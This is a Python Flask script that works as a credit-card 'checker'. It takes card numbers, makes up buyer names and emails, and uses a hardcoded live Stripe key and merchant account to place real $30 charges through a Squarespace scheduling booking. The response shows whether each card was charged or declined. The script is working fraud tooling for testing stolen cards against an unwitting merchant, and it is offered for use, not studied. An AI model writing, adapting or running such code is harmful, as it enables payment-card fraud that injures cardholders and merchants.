from flask import Flask
import requests
import os
import random
import uuid
from faker import Faker
from urllib.parse import urlencode

faker = Faker()
app = Flask(__name__)

@app.route("/card=<P>")
def check_strip(P):
    try:
        n, mm, yy, cvc = map(str.strip, P.split("|"))
        no = faker.first_name().upper()
        mo = faker.first_name().upper()
        name = f"{no} {mo}"
        bb = 'qwaszxcerdfvbtyghnmjkluiop0987654321'
        hell = ''.join(random.choice(bb) for i in range(14))
        domin = random.choice(['@hotmail.com', '@aol.com', '@gmail.com', '@yahoo.com'])
        email = hell + domin

        url = "https://app.squarespacescheduling.com/schedule.php?owner=21346949&calendarID=4717062"
        hd = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
            "Pragma": "no-cache",
            "Accept": "*/*"
        }
        reb = requests.get(url, headers=hd)
        phpsessid = reb.cookies.get("PHPSESSID")

        url = "https://api.stripe.com/v1/payment_methods"
        data = {
            "type": "card",
            "billing_details[name]": str(name),
            "billing_details[email]": str(email),
            "billing_details[address][postal_code]": "10080",
            "card[number]": n,
            "card[exp_month]": mm,
            "card[exp_year]": yy,
            "guid": str(uuid.uuid4()),
            "muid": str(uuid.uuid4()),
            "sid": str(uuid.uuid4()),
            "pasted_fields": "number",
            "payment_user_agent": "stripe.js%2F04dac047e0%3B+stripe-js-v3%2F04dac047e0%3B+card-element",
            "time_on_page": "193418",
            "key": "pk_live_Y1CqsAphMF6hE2OORZmZSBYl",
            "_stripe_account": "acct_1Hr4hzAnMU46zgL6"
        }
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
            "Pragma": "no-cache",
            "Accept": "*/*",
            "Content-Type": "application/x-www-form-urlencoded"
        }
        re = requests.post(url, headers=headers, data=urlencode(data))
        try:
            id = re.json()['id']            
        except KeyError:
            id = 'pm_1P4APfKEzvleW5flXGL0re1p'

        url = f"https://app.squarespacescheduling.com/schedule.php?action=getIntent&owner=21204314&PHPSESSID={phpsessid}"
        data = {
            "amount": "30",
            "clientDetails[name]": str(name),
            "clientDetails[address_zip]": "10080",
            "clientDetails[email]": str(email),
            "description": f"1112891149 - {name} - Standard Studio A Rental - September 7, 2023 4:00pm",
            "pm": str(id)
        }
        response = requests.post(url, headers=headers, data=urlencode(data))
        pi = response.text.split('"intent":"')[1].split('"')[0]
        cs = response.text.split('"clientSecret":"')[1].split('"')[0]

        url = f"https://api.stripe.com/v1/payment_intents/{pi}/confirm"
        data = {
            "payment_method": str(id),
            "expected_payment_method_type": "card",
            "use_stripe_sdk": "true",
            "key": "pk_live_Y1CqsAphMF6hE2OORZmZSBYl",
            "_stripe_account": "acct_1Hr4hzAnMU46zgL6",
            "client_secret": str(cs)
        }
        res = requests.post(url, headers=headers, data=urlencode(data))
        
        if "message" in res.text:
            return res.json()['error']['message']
        elif "decline_code" in res.text:
            return res.json()['error']['decline_code']
        elif res.json().get("status") == "succeeded" or res.json().get("cvc_check") == "pass":
            return {'By': 'AHMED', 'status': 'CHRAGE✅'} 
        else:
            return {'By': 'AHMED', 'status': 'Erorr','msg': res.json()}
    except:
        return {'By': 'AHMED', 'status': 'Erorr'}

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
